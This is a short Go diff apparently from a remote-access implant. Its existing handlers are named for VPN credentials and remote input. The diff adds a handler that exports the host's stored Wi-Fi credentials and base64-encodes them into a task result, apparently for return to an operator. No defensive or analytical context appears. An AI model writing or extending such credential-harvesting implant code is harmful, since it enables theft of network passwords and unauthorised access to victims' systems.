@@ -227,6 +227,12 @@ func handleVpnCreds(task Task, res *TaskResult) {
 	res.Encoding = "base64"
 }
 
+func handleWifiCreds(task Task, res *TaskResult) {
+	out := exportWifiCreds()
+	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+	res.Encoding = "base64"
+}
+
 func handleRemoteInput(task Task, res *TaskResult) {
 	payload := task.Data
 	if payload == "" {
